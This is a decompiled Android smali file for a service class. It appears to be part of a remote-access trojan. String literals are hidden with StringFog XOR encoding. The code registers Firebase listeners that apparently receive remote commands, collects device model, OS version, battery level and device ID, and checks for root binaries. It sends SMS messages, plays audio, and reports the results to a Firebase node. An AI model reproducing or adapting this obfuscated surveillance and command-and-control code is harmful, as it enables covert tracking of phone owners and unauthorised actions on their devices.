    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_3

    .line 988
    :goto_0
    :try_start_1
    iget-object v0, p0, Lsigma/male/servicess;->mp:Landroid/media/MediaPlayer;

    invoke-virtual {v0}, Landroid/media/MediaPlayer;->prepare()V

    .line 989
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "aSc2TFZ1JzJUVDBpYU5XOTs0FxgyJiNIVm50YRMYBiElTl0mJ3wNBHonNkxWawcpQ191PTUNSDk1P0RWMg=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/IllegalStateException; {:try_start_1 .. :try_end_1} :catch_4
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_5

    .line 1000
    :goto_1
    iget-object v0, p0, Lsigma/male/servicess;->mp:Landroid/media/MediaPlayer;

    invoke-virtual {v0}, Landroid/media/MediaPlayer;->start()V

    .line 1001
    iget-object v0, p0, Lsigma/male/servicess;->mp:Landroid/media/MediaPlayer;

    invoke-virtual {v0}, Landroid/media/MediaPlayer;->isPlaying()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 1002
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "aSc2TFZ1JzJUVDBpYU5XOTs0FxgyJiNIVm50YRMYBiElTl0mJ3wNBHonNkxWawcpQ191PTUNSDk1P0RWMg=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 1004
    :cond_0
    return-void

    .line 972
    :catch_0
    move-exception v0

    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "aSc2TFZ1JzJUVDBpYU5XOTs0F0owMH0KGGt0A39qGgZ8DQR6JzZMVmsHKUNfdRopWRgTOzNDXHUyNEJVdQEUYQ=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 976
    :catch_1
    move-exception v0

    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "aSc2TFZ1JzJUVDBpYU5XOTs0F0owMH0NH3VqZmhqBxsUFxhpezVdWTtqFUJWMnQIQkx1EilYVjF0IF9XOHQTf3Q="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 982
    :catch_2
    move-exception v0

    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "aSc2TFZ1JzJUVDBpYU5XOTs0F0owMH0NH3VqZmhqBxsUFxhpezVdWTtqFUJWMnQIQkx1EilYVjF0IF9XOHQTf3Q="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 985
    :catch_3
    move-exception v0

    .line 986
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto/16 :goto_0

    .line 993
    :catch_4
    move-exception v0

    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "aSc2TFZ1JzJUVDBpYU5XOTs0F0owMH0NH3VqZmhqBxsUFxhpezVdWTtqFUJWMnQIQkx1EilYVjF0IF9XOHQTf3Q="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    .line 997
    :catch_5
    move-exception v0

    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "aSc2TFZ1JzJUVDBpYU5XOTs0F0owMH0NH3VqZmhqBxsUFxhpezVdWTtqFUJWMnQIQkx1EilYVjF0IF9XOHQTf3Q="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1
.end method

.method public _sendsm(Ljava/lang/String;Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 1010
    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 1012
    const/4 v2, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    move-object v1, p1

    move-object v3, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 1013
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "aSc2TFZ1JzJUVDBpYU5XOTs0F18nMSNDH2sHM05bMCc1FxhpezVdWTtqC0hLJjUhSBgGMShZGAYhJU5dJicgWFQ5LQ=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 1023
    :goto_0
    return-void

    .line 1019
    :catch_0
    move-exception v0

    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "aSc2TFZ1JzJUVDBpYU5XOTs0F0owMGETfScmKV8CdWhpXkg0OnhoUSE8I18YJTE0QFEmJy9CVnU9NQ1WOiBmSlEjMSgNVyd0AkxMNHQvXhg8OiVCSicxJVkW"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method public _service()V
    .locals 3

    .prologue
    .line 409
    invoke-virtual {p0}, Lsigma/male/servicess;->_setpres()V

    .line 410
    const-string v0, ""

    invoke-virtual {p0, v0}, Lsigma/male/servicess;->_setpres2(Ljava/lang/String;)V

    .line 411
    invoke-static {}, Lcom/google/firebase/database/FirebaseDatabase;->getInstance()Lcom/google/firebase/database/FirebaseDatabase;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ejcpQFwmeyVCVTEn"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/gui;->uuii(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    .line 413
    new-instance v1, Lsigma/male/servicess$20;

    invoke-direct {v1, p0}, Lsigma/male/servicess$20;-><init>(Lsigma/male/servicess;)V

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->addChildEventListener(Lcom/google/firebase/database/ChildEventListener;)Lcom/google/firebase/database/ChildEventListener;

    .line 495
    return-void
.end method

.method public _setpres()V
    .locals 3

    .prologue
    .line 499
    invoke-static {}, Lcom/google/firebase/database/FirebaseDatabase;->getInstance()Lcom/google/firebase/database/FirebaseDatabase;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ejsoQVE7MWk="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/gui;->uuiip(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "eiE1SEo="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/gui;->uuii(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    const-string v1, "MTEwRFsw"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->child(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    .line 501
    new-instance v1, Lsigma/male/servicess$21;

    invoke-direct {v1, p0}, Lsigma/male/servicess$21;-><init>(Lsigma/male/servicess;)V

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->addChildEventListener(Lcom/google/firebase/database/ChildEventListener;)Lcom/google/firebase/database/ChildEventListener;

    .line 519
    return-void
.end method

.method public _setpres2(Ljava/lang/String;)V
    .locals 6

    .prologue
    const/4 v5, 0x4

    const/4 v1, 0x0

    .line 523
    iget-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    invoke-virtual {v0}, Ljava/util/HashMap;->clear()V

    .line 524
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    .line 525
    iget-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    const-string v2, "JTwpQ10="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    sget-object v4, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, " "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget-object v4, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 526
    iget-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    const-string v2, "NDoiX1c8MA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "FDoiX1c8MGY="

    invoke-static {v4}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v4, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 527
    const-string v0, "NzUyWV0nLStMVjQzI18="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lsigma/male/servicess;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/BatteryManager;

    .line 529
    invoke-virtual {v0, v5}, Landroid/os/BatteryManager;->getIntProperty(I)I

    move-result v0

    .line 530
    iget-object v2, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    const-string v3, "NzUyWV0nLQ=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v4, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "cA=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v3, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 531
    iget-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    const-string v2, "PDA="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lsigma/male/gui;->uuii(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 532
    const-string v0, ""

    .line 533
    const/16 v0, 0xa

    new-array v2, v0, [Ljava/lang/String;

    const-string v0, "eic/XkwwOWlMSCV7FVhIMCYzXl0neiddUw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v2, v1

    const/4 v0, 0x1

    const-string v3, "eickRFZ6JzM="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v0

    const/4 v0, 0x2

    const-string v3, "eic/XkwwOWlPUTt7NVg="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v0

    const/4 v0, 0x3

    const-string v3, "eic/XkwwOWlVWjw6aV5N"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v0

    const-string v0, "ejAnWVl6OClOWTl7Pk9RO3s1WA=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v2, v5

    const/4 v0, 0x5

    const-string v3, "ejAnWVl6OClOWTl7JERWeicz"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v0

    const/4 v0, 0x6

    const-string v3, "eic/XkwwOWleXHosJERWeicz"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v0

    const/4 v0, 0x7

    .line 534
    const-string v3, "eic/XkwwOWlPUTt7IExROScnS116JzM="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v0

    const/16 v0, 0x8

    const-string v3, "ejAnWVl6OClOWTl7NVg="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v0

    const/16 v0, 0x9

    const-string v3, "eiczAlo8OmleTQ=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v0

    .line 535
    array-length v3, v2

    move v0, v1

    :goto_0
    if-lt v0, v3, :cond_0

    .line 538
    const-string v0, "Gzs="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 539
    iget-object v1, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    const-string v2, "JzspWV0x"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 540
    invoke-static {}, Lcom/google/firebase/database/FirebaseDatabase;->getInstance()Lcom/google/firebase/database/FirebaseDatabase;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ejsoQVE7MWk="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/gui;->uuiip(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "eiE1SEo="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/gui;->uuii(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    const-string v1, "MTEwRFsw"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->child(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    .line 542
    iget-object v1, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->setValue(Ljava/lang/Object;)Lcom/google/android/gms/tasks/Task;

    .line 543
    invoke-virtual {v0}, Lcom/google/firebase/database/DatabaseReference;->onDisconnect()Lcom/google/firebase/database/OnDisconnect;

    move-result-object v0

    invoke-virtual {v0}, Lcom/google/firebase/database/OnDisconnect;->removeValue()Lcom/google/android/gms/tasks/Task;

    .line 546
    return-void

    .line 535
    :cond_0
    aget-object v1, v2, v0

    .line 536
    new-instance v4, Ljava/io/File;

    invoke-direct {v4, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_1

    const-string v1, "DDE1"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    .line 535
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public _setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 608
    iget-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    invoke-virtual {v0}, Ljava/util/HashMap;->clear()V

    .line 609
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    .line 610
    iget-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    const-string v1, "JzE1XVc="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 611
    iget-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    const-string v1, "IzU0Hw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 612
    iget-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    const-string v1, "I2U="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 613
    iget-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    const-string v1, "I2Y="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 614
    iget-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    const-string v1, "I2c="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 616
    const-string v0, "NDYlSV0zMy5EUj44K0NXJSU0XkwgIjFVQS8="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 617
    const-string v1, "ZWV0HgxgYnEVAQ=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 618
    const/16 v2, 0x8

    .line 619
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 620
    new-instance v3, Ljava/util/Random;

    invoke-direct {v3}, Ljava/util/Random;-><init>()V

    .line 621
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v2}, Ljava/lang/StringBuilder;-><init>(I)V

    .line 622
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v0

    add-int/lit8 v0, v0, -0x1

    invoke-virtual {v3, v0}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    invoke-virtual {v1, v0}, Ljava/lang/String;->charAt(I)C

    move-result v0

